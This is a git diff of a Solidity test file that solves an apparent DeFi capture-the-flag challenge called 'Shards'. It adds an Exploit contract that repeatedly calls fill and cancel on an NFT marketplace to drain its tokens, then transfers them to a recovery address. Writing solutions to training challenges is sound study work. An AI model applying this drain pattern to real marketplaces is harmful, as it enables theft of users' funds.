@@ -24,7 +24,7 @@ contract ShardsChallenge is Test {
     uint256 constant SELLER_NFT_BALANCE = 1;
     uint256 constant SELLER_DVT_BALANCE = 75e19;
     uint256 constant STAKING_RATE = 1e18;
-    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
+    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15; // 0.075e18 DVT per USDC
     uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
     uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;
 
@@ -114,7 +114,8 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        // Execute attack
+        new Exploit(marketplace, token, recovery);
     }
 
     /**
@@ -134,5 +135,17 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+contract Exploit {
+    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery) {
+        // Exploit free fill and cancel to drain marketplace
+        for (uint256 i = 0; i < 10001; i++) {
+            marketplace.fill(1, 100);
+            marketplace.cancel(1, i);
+        }
+
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
